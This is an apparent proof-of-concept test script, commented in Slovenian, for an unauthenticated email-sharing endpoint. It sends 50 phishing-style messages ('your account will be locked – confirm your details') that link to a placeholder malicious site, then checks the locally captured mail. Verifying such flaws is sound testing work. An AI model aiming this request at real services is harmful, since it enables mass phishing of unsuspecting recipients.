#!/bin/bash
# EE-N02: neprijavljen klic /api/polls/share-email s poljubnimi prejemniki, naslovom in povezavo.
B=${B:-http://localhost:3000}; OUT=${1:?mapa z zajeto e-pošto}; N=${2:-50}; rm -f "$OUT"/*
R=$(for i in $(seq $N); do printf '"zrtev%s@primer.si",' $i; done)
curl -s -w ' [HTTP %{http_code}]\n' -X POST $B/api/polls/share-email -H 'content-type: application/json' \
  -d "{\"share_link\":\"https://zlonamerna-stran.example/prijava\",\"title\":\"Vaš račun bo zaklenjen – potrdite podatke\",\"recipients\":[${R%,}]}"
echo "zajetih e-pošt: $(ls "$OUT" | wc -l)"
f=$(ls "$OUT"/* | head -1); echo "primer: ZA $(jq -r '.to[0]' $f) | OD $(jq -r .from $f) | ZADEVA $(jq -r .subject $f)"
jq -r '.html | gsub("<br>"; "\n") | gsub("<[^>]*>"; "")' $f | sed '/^\s*$/d'
